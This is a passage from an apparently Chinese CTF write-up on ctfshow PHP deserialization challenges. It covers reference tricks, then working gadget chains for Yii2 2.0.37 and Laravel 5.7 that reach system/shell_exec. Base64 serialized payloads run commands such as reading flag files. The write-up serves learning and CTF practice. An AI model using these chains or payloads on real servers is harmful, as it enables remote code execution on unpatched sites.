class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码的大致意思是要让一个随机token值和password相等，这个mt_rand不好预测（主要是我也不知道怎么预测），尝试引用的方法，将password赋值为token的引用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;<span class="comment">//不能直接等于</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>引用（&amp;）的用法和应用</p>
<p>在PHP 中引用的意思是：<strong>不同的名字访问同一个变量内容</strong></p>
<p><a href="https://www.cnblogs.com/alsf/p/9621362.html">https://www.cnblogs.com/alsf/p/9621362.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a=&quot;ABC&quot;;</span><br><span class="line">    $b =&amp;$a;  //$b 指向$a的地址</span><br><span class="line">    echo $a;//这里输出:ABC</span><br><span class="line">    echo $b;//这里输出:ABC</span><br><span class="line">    $b=&quot;EFG&quot;; //$a 的地址内容为EFG</span><br><span class="line">    echo $a;//这里$a的值变为EFG 所以输出EFG</span><br><span class="line">    echo $b;//这里输出EFG</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;CTFSHOW&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>PHP特性：函数名和类名不区分大小写，变量名区分。</p>
<p>经过尝试hackbar,不能post  php:&#x2F;&#x2F;input,除了max hackbar,传参得到</p>
<h1 id="web267-270yii"><a href="#web267-270yii" class="headerlink" title="web267-270yii"></a>web267-270yii</h1><p>Yii 是一个通用的 Web 编程框架，即可以用于开发各种用 PHP 构建的 Web 应用。 因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统(CMS)、 电子商务项目和 RESTful Web 服务等。</p>
<h2 id="环境搭建yii2-0-37"><a href="#环境搭建yii2-0-37" class="headerlink" title="环境搭建yii2.0.37"></a>环境搭建yii2.0.37</h2><p>yii2.0.38之前的版本中</p>
<p><a href="https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz">yii-basic-app-2.0.37.tgz</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/yiisoft/yii2/releases/tag/2.0.37</span><br></pre></td></tr></table></figure>

<p>然后修改&#x2F;config&#x2F;web.php文件17行cookieValidationKey,可以随便定义</p>
<p>进入当前目录 执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php yii serve</span><br></pre></td></tr></table></figure>

<p>然后访问 127.0.0.1:8080环境搭建完成，</p>
<h2 id="namespacce简述"><a href="#namespacce简述" class="headerlink" title="namespacce简述"></a>namespacce简述</h2><p>PHP 命名空间(namespace)是在 PHP 5.3 中加入的，目的是解决重名问题，PHP中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。</p>
<p>PHP 命名空间可以解决以下两类问题：</p>
<ol>
<li>用户编写的代码与PHP内部的类&#x2F;函数&#x2F;常量或第三方类&#x2F;函数&#x2F;常量之间的名字冲突。</li>
<li>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</li>
</ol>
<p><a href="https://www.php.net/manual/zh/language.namespaces.rationale.php">PHP: 命名空间概述 - Manual</a></p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>利用点在</p>
<p>basic&#x2F;vendor&#x2F;yiisoft&#x2F;yii2&#x2F;db&#x2F;BatchQueryResult.php</p>
<p>中的BatchQueryResult-&gt;__destruct()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// make sure cursor is closed</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">reset</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_dataReader !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_dataReader-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_dataReader = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_batch = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_value = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_key = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里close 文件只有一处调用，所以不考虑，搜索文件中的_calll 方法</p>
<p><strong>当调用类中不存在的方法时就会调用__call</strong>，此时__call 传入一个值为close</p>
<p>basic&#x2F;vendor&#x2F;fzaninotto&#x2F;faker&#x2F;src&#x2F;Faker&#x2F;Generator.php中的</p>
<p>class Generator-&gt;__call();</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$method</span>, <span class="variable">$attributes</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>即$method &#x3D;close,即$formatter&#x3D;close</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$formatter</code>与<code>$arguments</code>我们都不可控$formatter&#x3D;close,$arguments值为空</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>); </span><br><span class="line">&#125;TXQceb0-Mh</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/m0_37866091/article/details/122128344">PHP函数详解：call_user_func() 与 call_user_func_array()使用方法_call_user_func以及call_user_fun_array-CSDN博客</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$formatter</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>)) &#123;</span><br><span class="line">             <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>] = <span class="keyword">array</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>);</span><br><span class="line"></span><br><span class="line">             <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">         &#125;s</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\InvalidArgumentException</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="variable">$formatter</span>));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$providers</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$formatters</span> = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$this-&gt;formatters 是可以控制的，也就意味着<code>getFormatter</code>方法的返回值是可控的。</p>
<p>这里$this-&gt;formatters[‘close’] &#x3D; [new CreateAction(), ‘run’];</p>
<p><code>all_user_func_array</code>这个函数的第一个参数可控，第二个参数为空</p>
<p>basic&#x2F;vendor&#x2F;yiisoft&#x2F;yii2&#x2F;rest&#x2F;IndexAction.php中的IndexAction-&gt;run() 方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;checkAccess) &#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;checkAccess, <span class="variable">$this</span>-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepareDataProvider</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;dir&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123; </span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>到这里链子构建成功</p>
<p>但没有接口在controllers 下建立文件Testcontrollers.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controllers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Yii</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">filters</span>\<span class="title">VervFilter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">filters</span>\<span class="title">AccessControl</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">models</span>\<span class="title">LoginForm</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> \<span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionSss</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后，访问，弹出计算器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/index.php?r=test/sss&amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjQ6ImNhbGMiO31pOjE7czozOiJydW4iO319fX0=</span><br></pre></td></tr></table></figure>

<p>以上为本地分析，然后进行做题</p>
<p>yii反序列化漏洞<br>弱密码 admin admin登录成功后，在about页面发现提示?view-source<br>访问url&#x2F;?r&#x3D;site&#x2F;about&amp;view-source得到反序列化点<br>payload ?r&#x3D;backdoor&#x2F;shell&amp;code&#x3D;poc</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjE2OiJjYXQgL2ZsYWcgPjIudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure>

<h1 id="web268-270"><a href="#web268-270" class="headerlink" title="web268 -270"></a>web268 -270</h1><p>还是用这条链子但命令执行函数system 用不了了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">cp</span> /<span class="title class_">f</span>* 1.<span class="title class_">txt</span>&#x27;); <span class="comment">//此处写命令</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0=</span><br></pre></td></tr></table></figure>

<h1 id="web271-laravel5-7"><a href="#web271-laravel5-7" class="headerlink" title="web271 laravel5.7"></a>web271 laravel5.7</h1><p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command=<span class="string">&quot;system&quot;</span>;   <span class="comment">//执行命令的函数</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters[]=<span class="string">&quot;tac /f*&quot;</span>;  <span class="comment">//要执行的命令</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test=<span class="keyword">new</span> <span class="title class_">GenericUser</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app=<span class="keyword">new</span> <span class="title class_">Application</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindings=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;concrete&#x27;</span>=&gt;<span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title 